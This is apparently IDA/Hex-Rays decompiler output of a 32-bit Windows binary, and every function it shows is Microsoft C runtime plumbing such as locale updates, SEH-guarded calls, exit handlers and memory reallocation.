// 40331F: could not find valid save-restore pair for edi

//----- (00403D20) --------------------------------------------------------
int __usercall sub_403D20@<eax>(int (*a1)(void)@<eax>)
{
  return a1();
}

//----- (00404827) --------------------------------------------------------
int sub_404827()
{
  return dword_414DAC;
}
// 414DAC: using guessed type int dword_414DAC;

//----- (0040482D) --------------------------------------------------------
int __cdecl sub_40482D(int a1)
{
  int result; // eax

  result = a1;
  dword_414DAC = a1;
  return result;
}
// 414DAC: using guessed type int dword_414DAC;

//----- (004048A5) --------------------------------------------------------
int __cdecl sub_4048A5(int a1)
{
  return unknown_libname_2(a1);
}
// 40485B: using guessed type _DWORD __stdcall unknown_libname_2(_DWORD);

//----- (00404DD9) --------------------------------------------------------
void *__cdecl sub_404DD9(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_414FD0 )
    return (void *)unknown_libname_3(*a1);
  return result;
}

//----- (00404DF4) --------------------------------------------------------
void *__cdecl sub_404DF4(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_414FCC )
    return (void *)unknown_libname_3(*a1);
  return result;
}

//----- (0040514D) --------------------------------------------------------
int __cdecl sub_40514D(int a1)
{
  int result; // eax

  result = a1;
  dword_414FDC = a1;
  return result;
}
// 414FDC: using guessed type int dword_414FDC;

//----- (0040521B) --------------------------------------------------------
__int32 sub_40521B()
{
  return _InterlockedExchange(&dword_414FE4, 1);
}
// 414FE4: using guessed type int dword_414FE4;

//----- (004052DA) --------------------------------------------------------
int sub_4052DA()
{
  return dword_414FE8;
}
// 414FE8: using guessed type int dword_414FE8;

//----- (0040530F) --------------------------------------------------------
void *sub_40530F()
{
  return &unk_414FEC;
}

//----- (004053B7) --------------------------------------------------------
int __cdecl sub_4053B7(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 405366: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 4053B7: using guessed type int var_8;

//----- (004053DF) --------------------------------------------------------
int __cdecl sub_4053DF(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 405315: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 4053DF: using guessed type int var_8;

//----- (00405668) --------------------------------------------------------
int __cdecl sub_405668(_onexit_t Function)
{
  return _register_onexit_function(&stru_414FF0, Function);
}

//----- (004056FC) --------------------------------------------------------
char sub_4056FC()
{
  unknown_libname_2(&off_414580);
  return 1;
}
// 40485B: using guessed type _DWORD __stdcall unknown_libname_2(_DWORD);
// 414580: using guessed type wchar_t *off_414580;

//----- (00405728) --------------------------------------------------------
char sub_405728()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 404E0F: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0040576D) --------------------------------------------------------
__vcrt_bool sub_40576D()
{
  return __vcrt_uninitialize(0);
}

//----- (00405BCA) --------------------------------------------------------
int __cdecl sub_405BCA(int a1)
{
  return unknown_libname_2(a1);
}
// 40485B: using guessed type _DWORD __stdcall unknown_libname_2(_DWORD);

//----- (00405D39) --------------------------------------------------------
char sub_405D39()
{
  hHeap = 0;
  return 1;
}

//----- (00405EC1) --------------------------------------------------------
int __cdecl sub_405EC1(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(
           &v3,
           a2,
           &v4);
}
// 405DCD: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD);
// 405EC1: using guessed type int var_8;

//----- (00405EE9) --------------------------------------------------------
int __cdecl sub_405EE9(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(
           &v3,
           a2,
           &v4);
}
// 405D7D: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD);
// 405EE9: using guessed type int var_8;

//----- (00405F11) --------------------------------------------------------
int __cdecl sub_405F11(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(
           &v3,
           a2,
           &v4);
}
// 405E2E: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD);
// 405F11: using guessed type int var_8;

//----- (00405F39) --------------------------------------------------------
int __cdecl sub_405F39(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(
           &v3,
           a2,
           &v4);
}
// 405E79: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD);
// 405F39: using guessed type int var_8;

//----- (0040669C) --------------------------------------------------------
int __thiscall sub_40669C(_DWORD **this, void *Block)
{
  int v3; // edi

  v3 = unknown_libname_8();
  if ( v3 )
  {
    _free_base(Block);
    return v3;
  }
  else
  {
    *this[1]++ = Block;
    return 0;
  }
}
// 4066D1: using guessed type int unknown_libname_8(void);

//----- (004067A6) --------------------------------------------------------
int __cdecl sub_4067A6(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 406763: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 4067A6: using guessed type int var_8;

//----- (004081CE) --------------------------------------------------------
char *__cdecl sub_4081CE(void *Block, unsigned int a2, unsigned int a3)
{
  size_t v4; // edi
  unsigned int v5; // esi
  char *v6; // ebx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( a2 && 0xFFFFFFE0 / a2 < a3 )
  {
    *_errno() = 12;
    return 0;
  }
  else
  {
    if ( Block )
      v4 = _msize(Block);
    else
      v4 = 0;
    v5 = a3 * a2;
    v6 = (char *)_realloc_base(Block, a3 * a2);
    if ( v6 )
    {
      if ( v4 < v5 )
        memset(&v6[v4], 0, v5 - v4);
    }
    return v6;
  }
}

//----- (00408316) --------------------------------------------------------
int __cdecl sub_408316(int a1)
{
  return unknown_libname_2(a1);
}
// 40485B: using guessed type _DWORD __stdcall unknown_libname_2(_DWORD);

//----- (0040841A) --------------------------------------------------------
int __cdecl sub_40841A(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(
           &v3,
           a2,
           &v4);
}
// 4083C0: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD);
// 40841A: using guessed type int var_8;

//----- (00408C69) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_408C69(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_415464 )
  {
    result = (struct __crt_locale_data *)dword_4146A0;
    if ( (dword_4146A0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 408107: using guessed type int __acrt_update_thread_locale_data(void);
// 4146A0: using guessed type int dword_4146A0;

//----- (00408C96) --------------------------------------------------------
void *__cdecl sub_408C96(int a1, void **a2)
{
  void *result; // eax

  result = *a2;
  if ( *a2 != off_414578 )
  {
    result = (void *)dword_4146A0;
    if ( (dword_4146A0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (void *)__acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}
// 406C5B: using guessed type int __acrt_update_thread_multibyte_data(void);
// 4146A0: using guessed type int dword_4146A0;

//----- (004097BB) --------------------------------------------------------
int sub_4097BB()
{
  return common_flush_all(1);
}
// 4097C4: using guessed type _DWORD __cdecl common_flush_all(_DWORD);

//----- (00409B89) --------------------------------------------------------
int __cdecl sub_409B89(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(
           &v3,
           a2,
           &v4);
}
// 409AF1: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD);
// 409B89: using guessed type int var_8;

//----- (0040A956) --------------------------------------------------------
int sub_40A956()
{
  dword_4554D8 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 4554D8: using guessed type int dword_4554D8;

//----- (0040ABF4) --------------------------------------------------------
void __usercall sub_40ABF4(char a1@<ch>, int a2@<ebp>)
{
  *(_BYTE *)(a2 - 144) = -2;
  if ( a1 && !isintTOS() )
    JUMPOUT(0x40AFB3);
  _ffexpm1();
  JUMPOUT(0x40AEF8);
}
// 40AC41: control flows out of bounds to 40AEF8
// 40AC63: control flows out of bounds to 40AFB3
// 40AD4E: using guessed type int _ffexpm1(void);
// 40AD91: using guessed type int isintTOS(void);

//----- (0040B536) --------------------------------------------------------
int __cdecl sub_40B536(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(
           &v3,
           a2,
           &v4);
}
// 40B4B4: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD);
// 40B536: using guessed type int var_8;

//----- (0040B55E) --------------------------------------------------------
int __cdecl sub_40B55E(int a1)
{
  int *v2; // [esp+4h] [ebp-4h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_415460
      && (*(_BYTE *)(dword_415260[a1 >> 6] + 48 * (a1 & 0x3F) + 40) & 1) != 0 )
    {
      v2 = &a1;
      return sub_40B536(a1, (int)&v2);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 415260: using guessed type int dword_415260[128];
// 415460: using guessed type int dword_415460;

// nfuncs=389 queued=63 decompiled=63 lumina nreq=0 worse=0 better=0
// ALL OK, 63 function(s) have been successfully decompiled
